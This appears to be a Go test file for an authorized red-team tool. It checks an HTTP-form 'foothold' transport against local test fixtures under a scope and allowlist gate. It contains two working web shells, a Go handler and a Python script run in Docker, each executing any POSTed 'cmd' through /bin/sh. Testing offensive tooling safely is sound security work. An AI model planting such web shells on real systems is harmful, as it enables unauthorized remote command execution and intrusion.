package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"blkchain/cli/internal/secgate"
)

func TestHTTPFormShellFixture(t *testing.T) {
	var secret [16]byte
	if _, err := rand.Read(secret[:]); err != nil {
		t.Fatal(err)
	}
	header := "Authorization: Bearer " + hex.EncodeToString(secret[:])
	t.Setenv("BLKCHAIN_WEB_SHELL_FIXTURE_HEADER", header)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost || r.Header.Get("Authorization") != strings.TrimPrefix(header, "Authorization: ") {
			w.WriteHeader(http.StatusForbidden)
			return
		}
		if err := r.ParseForm(); err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		command := r.FormValue("cmd")
		out, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		_, _ = w.Write(out)
	}))
	defer server.Close()
	u, err := url.Parse(server.URL)
	if err != nil {
		t.Fatal(err)
	}
	f, err := secgate.ParseFoothold(u.Hostname() + " transport=http-form url=" + server.URL + "/shell param=cmd headerenv=BLKCHAIN_WEB_SHELL_FIXTURE_HEADER surfaces=local,network,ad,container,cloud-aws,cloud-gcp")
	if err != nil {
		t.Fatal(err)
	}
	carrier, err := newFootholdTransport(f)
	if err != nil {
		t.Fatal(err)
	}
	localHeader := filepath.Join(t.TempDir(), "header")
	if err := os.WriteFile(localHeader, carrier.secrets[footholdSecretDir+"/http-header"], 0600); err != nil {
		t.Fatal(err)
	}
	runner := &engageRunner{runFn: func(ctx context.Context, stages []pipelineStage, _ string, _ int, _ time.Duration) (runResult, []isolatedStageResult) {
		if len(stages) != 1 || stages[0].Binary != "curl" {
			return runResult{Err: fmt.Errorf("unexpected HTTP form carrier")}, nil
		}
		args := append([]string(nil), stages[0].Args...)
		for i := range args {
			args[i] = strings.ReplaceAll(args[i], footholdSecretDir+"/http-header", localHeader)
		}
		out, err := exec.CommandContext(ctx, "curl", args...).CombinedOutput()
		code := 0
		if err != nil {
			code = 1
		}
		return runResult{Output: string(out), Err: err}, []isolatedStageResult{{Stdout: string(out), ExitCode: code}}
	}}
	result, outputs := runHTTPFormStages(context.Background(), runner, carrier.form, []pipelineStage{{Binary: "printf", Args: []string{"form-shell"}}},
		"fixture", 4096, 5*time.Second, secgate.DefaultPolicy(), false)
	if result.Err != nil || result.ExitCode != 0 || result.Output != "form-shell" || len(outputs) != 1 {
		t.Fatalf("HTTP form shell result=%+v outputs=%+v", result, outputs)
	}
	scope, err := secgate.ParseScope(strings.NewReader("127.0.0.1\n"))
	if err != nil {
		t.Fatal(err)
	}
	policy := secgate.DefaultPolicy()
	policy.Foothold = f
	gate := &secgate.Gate{Mode: secgate.Auto, Scope: scope, Policy: policy, Allow: secgate.NewAllowlist("curl")}
	if err := gate.Start(); err != nil {
		t.Fatal(err)
	}
	workspace := t.TempDir()
	trace := newActionTranscript(workspace, "off", policy.RunnerID, 10, 65536, nil)
	if err := os.WriteFile(filepath.Join(workspace, "actions.jsonl"), nil, 0600); err != nil {
		t.Fatal(err)
	}
	runner.foothold = carrier
	ctx := context.WithValue(context.Background(), engageRuntimeKey{}, &engageRuntime{runner: runner, trace: trace, policy: policy, cancel: func() {}})
	result = runAuthorized(ctx, gate, "printf", []string{"dispatched-form"}, "fixture", 4096, 5*time.Second,
		actionOrigin{TaskID: "fixture", Surface: secgate.SurfaceLocal})
	if result.Err != nil || result.Output != "dispatched-form" {
		t.Fatalf("HTTP form shell dispatch=%+v", result)
	}
	redirected := 0
	destination := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		redirected++
		w.WriteHeader(http.StatusOK)
	}))
	defer destination.Close()
	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, destination.URL, http.StatusTemporaryRedirect)
	}))
	defer origin.Close()
	form := *carrier.form
	form.url = origin.URL
	result, _ = runHTTPFormStages(context.Background(), runner, &form, []pipelineStage{{Binary: "true"}},
		"fixture", 4096, 5*time.Second, policy, false)
	if result.Err == nil || redirected != 0 {
		t.Fatalf("HTTP form shell followed redirect: redirected=%d result=%+v", redirected, result)
	}
}

func TestHTTPFormShellThroughGuardedWorker(t *testing.T) {
	if os.Getenv("BLKCHAIN_ENGAGE_DOCKER_E2E") != "1" {
		t.Skip("requires the pinned local Docker runner")
	}
	const script = `from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import subprocess
class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if not self.headers.get("Authorization"):
            self.send_error(403)
            return
        size = int(self.headers.get("Content-Length", "0"))
        if size < 1 or size > 65536:
            self.send_error(413)
            return
        fields = parse_qs(self.rfile.read(size).decode())
        command = fields.get("cmd", [""])[0]
        result = subprocess.run(command, shell=True, executable="/bin/sh", capture_output=True, timeout=5)
        body = result.stdout + result.stderr
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
`
	name := fmt.Sprintf("blkchain-form-shell-%d", os.Getpid())
	launch := exec.Command("docker", "run", "-d", "--rm", "--pull", "never", "--network", "bridge", "--name", name,
		"--read-only", "--tmpfs", "/tmp:rw,noexec,nosuid,size=16m", "--user", "1000:1000", "--cap-drop", "ALL",
		"--security-opt", "no-new-privileges", "--memory", "128m", "--pids-limit", "64",
		defaultRunnerTag(), "/usr/bin/python3", "-u", "-c", script)
	if out, err := launch.CombinedOutput(); err != nil {
		t.Fatalf("form shell fixture: %v %s", err, out)
	}
	t.Cleanup(func() { _ = exec.Command("docker", "rm", "-f", name).Run() })
	out, err := exec.Command("docker", "inspect", name, "--format", `{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}`).Output()
	ip := strings.TrimSpace(string(out))
	if err != nil || net.ParseIP(ip) == nil {
		t.Fatalf("form shell fixture IP: %v %q", err, out)
	}
	var secret [16]byte
	if _, err := rand.Read(secret[:]); err != nil {
		t.Fatal(err)
	}
	t.Setenv("BLKCHAIN_FORM_DOCKER_HEADER", "Authorization: Bearer "+hex.EncodeToString(secret[:]))
	roe, err := ParseRoE(strings.NewReader("## In Scope\n" + ip + "\n\n## Foothold\n" + ip + " transport=http-form url=http://" + ip + ":8080/shell param=cmd headerenv=BLKCHAIN_FORM_DOCKER_HEADER surfaces=local,network,ad,container,cloud-aws,cloud-gcp\n"))
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	runner, err := newEngageRunner(ctx, roe)
	if err != nil {
		t.Fatal(err)
	}
	defer runner.Close()
	gate := &secgate.Gate{Mode: secgate.Auto, Scope: roe.Scope, Policy: roe.Policy, Allow: secgate.NewAllowlist("curl")}
	if err := authorizeFootholdCarrier(gate, runner.foothold); err != nil {
		t.Fatal(err)
	}
	if err := gate.Start(); err != nil {
		t.Fatal(err)
	}
	result, outputs := runHTTPFormStages(ctx, runner, runner.foothold.form, []pipelineStage{{Binary: "printf", Args: []string{"guarded-form"}}},
		"form-fixture", 4096, 10*time.Second, roe.Policy, false)
	if result.Err != nil || result.Output != "guarded-form" || len(outputs) != 1 {
		t.Fatalf("guarded HTTP form shell result=%+v outputs=%+v", result, outputs)
	}
}
